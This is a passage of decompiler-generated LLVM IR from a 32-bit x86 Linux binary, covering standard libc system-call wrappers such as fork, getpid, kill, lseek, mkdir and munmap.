dec_label_pc_8059bcc:                             ; preds = %entry, %dec_label_pc_8059bc0
  %v0_8059bcc = phi i32 [ %v1_8059bb4, %entry ], [ -1, %dec_label_pc_8059bc0 ]
  %v2_8059bce = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8059bce, i32* @edx, align 4
  %v2_8059bd0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8059bd0, i32* @edi, align 4
  ret i32 %v0_8059bcc

; uselistorder directives
  uselistorder i32 %v1_8059bb4, { 1, 0, 2 }
  uselistorder i32 %v0_8059bac, { 1, 0, 2 }
  uselistorder i32 (i32)* @close, { 24, 23, 22, 21, 20, 19, 18, 17, 3, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8059bcc, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8059bd4 = load i32, i32* @ebx, align 4
  store i32 %v0_8059bd4, i32* %stack_var_-4, align 4
  %v1_8059bdd = call i32 @fork(i32 %v0_8059bd4)
  store i32 %v1_8059bdd, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8059bdd, -4095
  br i1 %tmp, label %dec_label_pc_8059bf4, label %dec_label_pc_8059be8

dec_label_pc_8059be8:                             ; preds = %entry
  %v0_8059be8 = load i32, i32* %stack_var_-4, align 4
  %v1_8059be8 = call i32 @__errno_location(i32 %v0_8059be8)
  %v0_8059bed = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059bed = sub i32 0, %v0_8059bed
  %v2_8059bef = inttoptr i32 %v1_8059be8 to i32*
  store i32 %v1_8059bed, i32* %v2_8059bef, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8059bf4

dec_label_pc_8059bf4:                             ; preds = %entry, %dec_label_pc_8059be8
  %v0_8059bf4 = phi i32 [ %v1_8059bdd, %entry ], [ -1, %dec_label_pc_8059be8 ]
  %v2_8059bf8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8059bf8, i32* @ebx, align 4
  ret i32 %v0_8059bf4

; uselistorder directives
  uselistorder i32 %v1_8059bdd, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32)* @fork, { 8, 7, 6, 3, 2, 5, 4, 1, 0 }
  uselistorder label %dec_label_pc_8059bf4, { 1, 0 }
}

define i32 @__libc_fsync(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8059bfc = load i32, i32* @edi, align 4
  store i32 %v0_8059bfc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_8059c04 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8059c0c = call i32 @fsync(i32 %v0_8059c04)
  store i32 %v1_8059c0c, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8059c0c, -4095
  br i1 %tmp, label %dec_label_pc_8059c24, label %dec_label_pc_8059c18

dec_label_pc_8059c18:                             ; preds = %entry
  %v1_8059c18 = call i32 @__errno_location(i32 %v0_8059c04)
  %v0_8059c1d = load i32, i32* %edi.global-to-local, align 4
  %v1_8059c1d = sub i32 0, %v0_8059c1d
  %v2_8059c1f = inttoptr i32 %v1_8059c18 to i32*
  store i32 %v1_8059c1d, i32* %v2_8059c1f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8059c24

dec_label_pc_8059c24:                             ; preds = %entry, %dec_label_pc_8059c18
  %v0_8059c24 = phi i32 [ %v1_8059c0c, %entry ], [ -1, %dec_label_pc_8059c18 ]
  %v2_8059c28 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8059c28, i32* @edi, align 4
  ret i32 %v0_8059c24

; uselistorder directives
  uselistorder i32 %v1_8059c0c, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8059c24, { 1, 0 }
}

define i32 @getdtablesize(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_8059c2f = ptrtoint i32* %stack_var_-8 to i32
  %v2_8059c36 = call i32 @getrlimit(i32 7, i32 %v2_8059c2f)
  store i32 256, i32* @edx, align 4
  %v2_8059c43 = icmp slt i32 %v2_8059c36, 0
  br i1 %v2_8059c43, label %dec_label_pc_8059c4b, label %dec_label_pc_8059c47

dec_label_pc_8059c47:                             ; preds = %entry
  %v3_8059c47 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8059c47, i32* @edx, align 4
  br label %dec_label_pc_8059c4b

dec_label_pc_8059c4b:                             ; preds = %entry, %dec_label_pc_8059c47
  %v0_8059c4b = phi i32 [ 256, %entry ], [ %v3_8059c47, %dec_label_pc_8059c47 ]
  ret i32 %v0_8059c4b

; uselistorder directives
  uselistorder i32 (i32, i32)* @getrlimit, { 1, 0 }
  uselistorder label %dec_label_pc_8059c4b, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8059c54 = load i32, i32* @ebx, align 4
  store i32 %v0_8059c54, i32* %stack_var_-4, align 4
  %v1_8059c5d = call i32 @int80_syscall(i32 201)
  store i32 %v1_8059c5d, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8059c5d, -4095
  br i1 %tmp, label %dec_label_pc_8059c74, label %dec_label_pc_8059c68

dec_label_pc_8059c68:                             ; preds = %entry
  %v0_8059c68 = load i32, i32* %stack_var_-4, align 4
  %v1_8059c68 = call i32 @__errno_location(i32 %v0_8059c68)
  %v0_8059c6d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059c6d = sub i32 0, %v0_8059c6d
  %v2_8059c6f = inttoptr i32 %v1_8059c68 to i32*
  store i32 %v1_8059c6d, i32* %v2_8059c6f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8059c74

dec_label_pc_8059c74:                             ; preds = %entry, %dec_label_pc_8059c68
  %v0_8059c74 = phi i32 [ %v1_8059c5d, %entry ], [ -1, %dec_label_pc_8059c68 ]
  %v2_8059c78 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8059c78, i32* @ebx, align 4
  ret i32 %v0_8059c74

; uselistorder directives
  uselistorder i32 %v1_8059c5d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 201, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8059c74, { 1, 0 }
}

define i32 @__GI_getpagesize(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8059c7c = load i32, i32* @global_var_807c8d0.673, align 16
  %v1_8059c86 = icmp eq i32 %v0_8059c7c, 0
  br i1 %v1_8059c86, label %dec_label_pc_8059c8c, label %dec_label_pc_8059c8a

dec_label_pc_8059c8a:                             ; preds = %entry
  br label %dec_label_pc_8059c8c

dec_label_pc_8059c8c:                             ; preds = %entry, %dec_label_pc_8059c8a
  %storemerge = phi i32 [ %v0_8059c7c, %dec_label_pc_8059c8a ], [ 4096, %entry ]
  %v0_8059c8c = phi i32 [ %v0_8059c7c, %dec_label_pc_8059c8a ], [ 4096, %entry ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_8059c8c

; uselistorder directives
  uselistorder label %dec_label_pc_8059c8c, { 1, 0 }
}

define i32 @__libc_getpid(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8059c90 = load i32, i32* @ebx, align 4
  store i32 %v0_8059c90, i32* %stack_var_-4, align 4
  %v1_8059c99 = call i32 @getpid(i32 %v0_8059c90)
  store i32 %v1_8059c99, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8059c99, -4095
  br i1 %tmp, label %dec_label_pc_8059cb0, label %dec_label_pc_8059ca4

dec_label_pc_8059ca4:                             ; preds = %entry
  %v0_8059ca4 = load i32, i32* %stack_var_-4, align 4
  %v1_8059ca4 = call i32 @__errno_location(i32 %v0_8059ca4)
  %v0_8059ca9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059ca9 = sub i32 0, %v0_8059ca9
  %v2_8059cab = inttoptr i32 %v1_8059ca4 to i32*
  store i32 %v1_8059ca9, i32* %v2_8059cab, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8059cb0

dec_label_pc_8059cb0:                             ; preds = %entry, %dec_label_pc_8059ca4
  %v0_8059cb0 = phi i32 [ %v1_8059c99, %entry ], [ -1, %dec_label_pc_8059ca4 ]
  %v2_8059cb4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8059cb4, i32* @ebx, align 4
  ret i32 %v0_8059cb0

; uselistorder directives
  uselistorder i32 %v1_8059c99, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8059cb0, { 1, 0 }
}

define i32 @getppid(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8059cb8 = load i32, i32* @ebx, align 4
  store i32 %v0_8059cb8, i32* %stack_var_-4, align 4
  %v1_8059cc1 = call i32 @getppid(i32 %v0_8059cb8)
  store i32 %v1_8059cc1, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8059cc1, -4095
  br i1 %tmp, label %dec_label_pc_8059cd8, label %dec_label_pc_8059ccc

dec_label_pc_8059ccc:                             ; preds = %entry
  %v0_8059ccc = load i32, i32* %stack_var_-4, align 4
  %v1_8059ccc = call i32 @__errno_location(i32 %v0_8059ccc)
  %v0_8059cd1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059cd1 = sub i32 0, %v0_8059cd1
  %v2_8059cd3 = inttoptr i32 %v1_8059ccc to i32*
  store i32 %v1_8059cd1, i32* %v2_8059cd3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8059cd8

dec_label_pc_8059cd8:                             ; preds = %entry, %dec_label_pc_8059ccc
  %v0_8059cd8 = phi i32 [ %v1_8059cc1, %entry ], [ -1, %dec_label_pc_8059ccc ]
  %v2_8059cdc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8059cdc, i32* @ebx, align 4
  ret i32 %v0_8059cd8

; uselistorder directives
  uselistorder i32 %v1_8059cc1, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32)* @getppid, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8059cd8, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8059ce0 = load i32, i32* @ebx, align 4
  store i32 %v0_8059ce0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8059cf3 = call i32 @int80_syscall(i32 191)
  store i32 %v1_8059cf3, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8059cf3, -4095
  br i1 %tmp, label %dec_label_pc_8059d0c, label %dec_label_pc_8059d00

dec_label_pc_8059d00:                             ; preds = %entry
  %v0_8059d00 = load i32, i32* %stack_var_-4, align 4
  %v1_8059d00 = call i32 @__errno_location(i32 %v0_8059d00)
  %v0_8059d05 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059d05 = sub i32 0, %v0_8059d05
  %v2_8059d07 = inttoptr i32 %v1_8059d00 to i32*
  store i32 %v1_8059d05, i32* %v2_8059d07, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8059d0c

dec_label_pc_8059d0c:                             ; preds = %entry, %dec_label_pc_8059d00
  %v0_8059d0c = phi i32 [ %v1_8059cf3, %entry ], [ -1, %dec_label_pc_8059d00 ]
  %v2_8059d10 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8059d10, i32* @ebx, align 4
  ret i32 %v0_8059d0c

; uselistorder directives
  uselistorder i32 %v1_8059cf3, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 191, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8059d0c, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8059d14 = load i32, i32* @ebx, align 4
  store i32 %v0_8059d14, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_8059d27 = call i32 @gettimeofday(i32 %v0_8059d14, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_8059d27, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8059d27, -4095
  br i1 %tmp, label %dec_label_pc_8059d40, label %dec_label_pc_8059d34

dec_label_pc_8059d34:                             ; preds = %entry
  %v0_8059d34 = load i32, i32* %stack_var_-4, align 4
  %v1_8059d34 = call i32 @__errno_location(i32 %v0_8059d34)
  %v0_8059d39 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059d39 = sub i32 0, %v0_8059d39
  %v2_8059d3b = inttoptr i32 %v1_8059d34 to i32*
  store i32 %v1_8059d39, i32* %v2_8059d3b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8059d40

dec_label_pc_8059d40:                             ; preds = %entry, %dec_label_pc_8059d34
  %v0_8059d40 = phi i32 [ %v4_8059d27, %entry ], [ -1, %dec_label_pc_8059d34 ]
  %v2_8059d44 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8059d44, i32* @ebx, align 4
  ret i32 %v0_8059d40

; uselistorder directives
  uselistorder i32 %v4_8059d27, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8059d40, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8059d48 = load i32, i32* @edi, align 4
  store i32 %v0_8059d48, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_8059d60 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8059d68 = call i32 @ioctl(i32 %v0_8059d60, i32 %tmp9, i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_8059d60, i32* @ebx, align 4
  store i32 %v3_8059d68, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_8059d68, -4095
  br i1 %tmp, label %dec_label_pc_8059d80, label %dec_label_pc_8059d74

dec_label_pc_8059d74:                             ; preds = %entry
  %v1_8059d74 = call i32 @__errno_location(i32 %v0_8059d60)
  %v0_8059d79 = load i32, i32* %edi.global-to-local, align 4
  %v1_8059d79 = sub i32 0, %v0_8059d79
  %v2_8059d7b = inttoptr i32 %v1_8059d74 to i32*
  store i32 %v1_8059d79, i32* %v2_8059d7b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8059d80

dec_label_pc_8059d80:                             ; preds = %entry, %dec_label_pc_8059d74
  %v0_8059d80 = phi i32 [ %v3_8059d68, %entry ], [ -1, %dec_label_pc_8059d74 ]
  %v2_8059d85 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8059d85, i32* @edi, align 4
  ret i32 %v0_8059d80

; uselistorder directives
  uselistorder i32 %v3_8059d68, { 1, 0, 2 }
  uselistorder i32 %v0_8059d60, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8059d80, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8059d88 = load i32, i32* @ebx, align 4
  store i32 %v0_8059d88, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_8059d9b = call i32 @kill(i32 %v0_8059d88, i32 %tmp4)
  store i32 %v2_8059d9b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8059d9b, -4095
  br i1 %tmp, label %dec_label_pc_8059db4, label %dec_label_pc_8059da8

dec_label_pc_8059da8:                             ; preds = %entry
  %v0_8059da8 = load i32, i32* %stack_var_-4, align 4
  %v1_8059da8 = call i32 @__errno_location(i32 %v0_8059da8)
  %v0_8059dad = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059dad = sub i32 0, %v0_8059dad
  %v2_8059daf = inttoptr i32 %v1_8059da8 to i32*
  store i32 %v1_8059dad, i32* %v2_8059daf, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8059db4

dec_label_pc_8059db4:                             ; preds = %entry, %dec_label_pc_8059da8
  %v0_8059db4 = phi i32 [ %v2_8059d9b, %entry ], [ -1, %dec_label_pc_8059da8 ]
  %v2_8059db6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8059db6, i32* @edx, align 4
  %v2_8059db8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8059db8, i32* @ebx, align 4
  ret i32 %v0_8059db4

; uselistorder directives
  uselistorder i32 %v2_8059d9b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @kill, { 10, 8, 0, 1, 9, 7, 6, 5, 4, 3, 2 }
  uselistorder label %dec_label_pc_8059db4, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8059dbe = load i32, i32* @ebx, align 4
  store i32 %v0_8059dbe, i32* %stack_var_-12, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v2_8059dd2 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8059dd2, i32* %esi.global-to-local, align 4
  %v1_8059de9 = call i32 @int80_syscall(i32 140)
  store i32 %v1_8059de9, i32* %esi.global-to-local, align 4
  %tmp16 = icmp ult i32 %v1_8059de9, -4095
  br i1 %tmp16, label %dec_label_pc_8059e03, label %dec_label_pc_8059df5

dec_label_pc_8059df5:                             ; preds = %entry
  %v2_8059dd6 = ashr i32 %arg3, 31
  %v1_8059df5 = call i32 @__errno_location(i32 %v2_8059dd6)
  %v0_8059dfa = load i32, i32* %esi.global-to-local, align 4
  %v1_8059dfa = sub i32 0, %v0_8059dfa
  %v2_8059dfc = inttoptr i32 %v1_8059df5 to i32*
  store i32 %v1_8059dfa, i32* %v2_8059dfc, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8059e07

dec_label_pc_8059e03:                             ; preds = %entry
  %v1_8059e03 = icmp eq i32 %v1_8059de9, 0
  br i1 %v1_8059e03, label %dec_label_pc_8059e0c, label %dec_label_pc_8059e07

dec_label_pc_8059e07:                             ; preds = %dec_label_pc_8059e03, %dec_label_pc_8059df5
  %v0_8059e07 = phi i32 [ %v1_8059de9, %dec_label_pc_8059e03 ], [ -1, %dec_label_pc_8059df5 ]
  %v1_8059e09 = ashr i32 %v0_8059e07, 31
  br label %dec_label_pc_8059e14

dec_label_pc_8059e0c:                             ; preds = %dec_label_pc_8059e03
  %v3_8059e0c = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_8059e14

dec_label_pc_8059e14:                             ; preds = %dec_label_pc_8059e07, %dec_label_pc_8059e0c
  %v0_8059e1a = phi i32 [ %v0_8059e07, %dec_label_pc_8059e07 ], [ %v3_8059e0c, %dec_label_pc_8059e0c ]
  %storemerge = phi i32 [ %v1_8059e09, %dec_label_pc_8059e07 ], [ %tmp, %dec_label_pc_8059e0c ]
  store i32 %storemerge, i32* @edx, align 4
  %v2_8059e17 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8059e17, i32* @ebx, align 4
  ret i32 %v0_8059e1a

; uselistorder directives
  uselistorder i32 %v1_8059de9, { 1, 2, 0, 3 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8059e14, { 1, 0 }
}

define i32 @_longjmp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v1_8059e29 = add i32 %arg1, 24
  %v2_8059e29 = inttoptr i32 %v1_8059e29 to i32*
  %v3_8059e29 = load i32, i32* %v2_8059e29, align 4
  %v4_8059e29 = icmp eq i32 %v3_8059e29, 0
  br i1 %v4_8059e29, label %dec_label_pc_8059e40, label %dec_label_pc_8059e2f

dec_label_pc_8059e2f:                             ; preds = %entry
  %v1_8059e2f = add i32 %arg1, 28
  %v3_8059e38 = inttoptr i32 %v1_8059e2f to %_TYPEDEF_sigset_t*
  %v4_8059e38 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8059e38, i32 0)
  %v0_8059e40.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8059e40

dec_label_pc_8059e40:                             ; preds = %entry, %dec_label_pc_8059e2f
  %v0_8059e44 = phi i32 [ %arg2, %entry ], [ %v0_8059e40.pre, %dec_label_pc_8059e2f ]
  %.0 = phi i32 [ undef, %entry ], [ %v4_8059e38, %dec_label_pc_8059e2f ]
  %v1_8059e40 = icmp eq i32 %v0_8059e44, 0
  %v1_8059e42 = icmp eq i1 %v1_8059e40, false
  br i1 %v1_8059e42, label %dec_label_pc_8059e46, label %dec_label_pc_8059e44

dec_label_pc_8059e44:                             ; preds = %dec_label_pc_8059e40
  %v1_8059e44 = and i32 %v0_8059e44, -256
  %v2_8059e44 = or i32 %v1_8059e44, 1
  br label %dec_label_pc_8059e46

dec_label_pc_8059e46:                             ; preds = %dec_label_pc_8059e40, %dec_label_pc_8059e44
  %v0_8059e48 = phi i32 [ %v0_8059e44, %dec_label_pc_8059e40 ], [ %v2_8059e44, %dec_label_pc_8059e44 ]
  %v0_8059e49 = load i32, i32* @esi, align 4
  %v4_8059e4a = inttoptr i32 %v0_8059e49 to i32*
  %v5_8059e4a = call i32 @__longjmp(i32* %v4_8059e4a, i32 %v0_8059e48, i32 %.0, i32 %.0)
  ret i32 %v5_8059e4a

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8059e46, { 1, 0 }
  uselistorder label %dec_label_pc_8059e40, { 1, 0 }
}

define i32 @__GI___libc_lseek(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8059e50 = load i32, i32* @edi, align 4
  store i32 %v0_8059e50, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v0_8059e60 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8059e68 = call i32 @lseek(i32 %v0_8059e60)
  store i32 %v0_8059e60, i32* @ebx, align 4
  store i32 %v1_8059e68, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8059e68, -4095
  br i1 %tmp, label %dec_label_pc_8059e80, label %dec_label_pc_8059e74

dec_label_pc_8059e74:                             ; preds = %entry
  %v1_8059e74 = call i32 @__errno_location(i32 %v0_8059e60)
  %v0_8059e79 = load i32, i32* %edi.global-to-local, align 4
  %v1_8059e79 = sub i32 0, %v0_8059e79
  %v2_8059e7b = inttoptr i32 %v1_8059e74 to i32*
  store i32 %v1_8059e79, i32* %v2_8059e7b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8059e80

dec_label_pc_8059e80:                             ; preds = %entry, %dec_label_pc_8059e74
  %v0_8059e80 = phi i32 [ %v1_8059e68, %entry ], [ -1, %dec_label_pc_8059e74 ]
  %v2_8059e84 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8059e84, i32* @edi, align 4
  ret i32 %v0_8059e80

; uselistorder directives
  uselistorder i32 %v1_8059e68, { 1, 0, 2 }
  uselistorder i32 %v0_8059e60, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8059e80, { 1, 0 }
}

define i32 @mkdir(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8059e88 = load i32, i32* @ebx, align 4
  store i32 %v0_8059e88, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_8059e9c = trunc i32 %tmp4 to i16
  %v3_8059e9c = call i32 @mkdir(i32 %v0_8059e88, i16 %v2_8059e9c)
  store i32 %v3_8059e9c, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v3_8059e9c, -4095
  br i1 %tmp, label %dec_label_pc_8059eb5, label %dec_label_pc_8059ea9

dec_label_pc_8059ea9:                             ; preds = %entry
  %v0_8059ea9 = load i32, i32* %stack_var_-4, align 4
  %v1_8059ea9 = call i32 @__errno_location(i32 %v0_8059ea9)
  %v0_8059eae = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059eae = sub i32 0, %v0_8059eae
  %v2_8059eb0 = inttoptr i32 %v1_8059ea9 to i32*
  store i32 %v1_8059eae, i32* %v2_8059eb0, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8059eb5

dec_label_pc_8059eb5:                             ; preds = %entry, %dec_label_pc_8059ea9
  %v0_8059eb5 = phi i32 [ %v3_8059e9c, %entry ], [ -1, %dec_label_pc_8059ea9 ]
  %v2_8059eb9 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8059eb9, i32* @ebx, align 4
  ret i32 %v0_8059eb5

; uselistorder directives
  uselistorder i32 %v3_8059e9c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8059eb5, { 1, 0 }
}

define i32 @__libc_msync(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8059ebc = load i32, i32* @edi, align 4
  store i32 %v0_8059ebc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v0_8059ecc = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8059ed4 = call i32 @msync(i32 %v0_8059ecc)
  store i32 %v1_8059ed4, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8059ed4, -4095
  br i1 %tmp, label %dec_label_pc_8059eec, label %dec_label_pc_8059ee0

dec_label_pc_8059ee0:                             ; preds = %entry
  %v1_8059ee0 = call i32 @__errno_location(i32 %v0_8059ecc)
  %v0_8059ee5 = load i32, i32* %edi.global-to-local, align 4
  %v1_8059ee5 = sub i32 0, %v0_8059ee5
  %v2_8059ee7 = inttoptr i32 %v1_8059ee0 to i32*
  store i32 %v1_8059ee5, i32* %v2_8059ee7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8059eec

dec_label_pc_8059eec:                             ; preds = %entry, %dec_label_pc_8059ee0
  %v0_8059eec = phi i32 [ %v1_8059ed4, %entry ], [ -1, %dec_label_pc_8059ee0 ]
  %v2_8059ef0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8059ef0, i32* @edi, align 4
  ret i32 %v0_8059eec

; uselistorder directives
  uselistorder i32 %v1_8059ed4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8059eec, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8059ef4 = load i32, i32* @ebx, align 4
  store i32 %v0_8059ef4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_8059f07 = call i32 @munmap(i32 %v0_8059ef4, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_8059f07, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8059f07, -4095
  br i1 %tmp, label %dec_label_pc_8059f20, label %dec_label_pc_8059f14

dec_label_pc_8059f14:                             ; preds = %entry
  %v0_8059f14 = load i32, i32* %stack_var_-4, align 4
  %v1_8059f14 = call i32 @__errno_location(i32 %v0_8059f14)
  %v0_8059f19 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059f19 = sub i32 0, %v0_8059f19
  %v2_8059f1b = inttoptr i32 %v1_8059f14 to i32*
  store i32 %v1_8059f19, i32* %v2_8059f1b, align 4
